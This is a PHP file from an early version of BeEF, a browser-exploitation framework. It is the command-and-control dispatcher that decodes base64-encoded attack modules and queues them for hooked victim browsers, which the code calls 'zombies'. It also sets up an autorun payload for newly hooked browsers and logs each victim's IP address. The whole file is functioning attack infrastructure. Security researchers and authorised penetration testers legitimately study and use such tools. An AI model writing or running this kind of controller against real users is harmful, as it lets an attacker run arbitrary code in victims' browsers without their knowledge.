<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../include/globals.inc.php");
	require_once("../include/common.inc.php");
	require_once("../include/ui_zombie.inc.php");

	session_start();

	$action = $_GET["action"];
	$result_id = $_GET["result_id"];

	if(!isset($_GET["action"])) beef_error('no action');
	if(!isset($_POST["data"])) beef_error('no data');

	// take action based on the action param
	switch ($action) {
		case "cmd": // command
			if(!isset($_GET["zombie"])) beef_error('no zombie');

			$zombie = $_GET["zombie"];
			$b64code = $_POST["data"];
			$code = build_base64_code($b64code);

			send_module_code($zombie, $code);

			beef_log("Module code sent", "Zombie at " . get_zombie_ip($zombie) . " got code:\n" . $code);

			echo "code sent";
			break;
		case "autorun": // autorun
			$b64code = $_POST["data"];
			$autorun_file = AUTORUN_TMP_DIR . AUTORUN_TMP_FILENAME;	
	
			if(stristr($b64code, "disable"))  {
				unlink($autorun_file);
				beef_log("Autorun disabled", "Autorun disabled");
			} else {
				$code = build_base64_code($b64code);
				
				file_put_contents($autorun_file, $code);
				beef_log("Autorun code set", "Autorun set with code:\n" . $code);
			}
			break;

		default: 
			beef_error("unknown action: $action"); 
	}
	
	function build_base64_code($b64code) {
			$code="";

			// sometimes there is a space in the b64code string - this shows a divid in the pieces
			// the pieces need to be put together post decode
			$b64_chunks = split(' ', $b64code );
			$items = count($b64_chunks);
			
			// build code from chunks
			for($i=0; $i<$items; $i++) {
				$code .= base64_decode($b64_chunks[$i]);
			}
		
		return $code;
	}
	
	function send_module_code($zombie, $code) {
		// check result location is set
		if(isset($_GET["result_id"]) && isset($_SESSION[$_GET["result_id"]])) {
			zombie_send_code_and_set_return($zombie, $_SESSION[$_GET["result_id"]], $code);
		} else {
			zombie_send_code($zombie, $code);
		}
	}

	// --[ ZOMBIE_SEND_CODE
	function zombie_send_code_and_set_return($zombie, $return_id, $code) {
		
		$zombie_dir = ZOMBIE_TMP_DIR . $_SESSION[$zombie];
		$cmd_file = $zombie_dir . "/" . CMD_FILENAME;
		$res_loc_file = $zombie_dir . "/" . RES_LOC_FILENAME;

		file_put_contents($cmd_file, $code);
		file_put_contents($res_loc_file, $return_id); // set return location
	}

	// --[ ZOMBIE_SEND_CODE
	function zombie_send_code($zombie, $code) {
		$zombie_dir = ZOMBIE_TMP_DIR . $_SESSION[$zombie];
		$cmd_file = $zombie_dir . "/" . CMD_FILENAME;

		file_put_contents($cmd_file, $code);
	}
?>
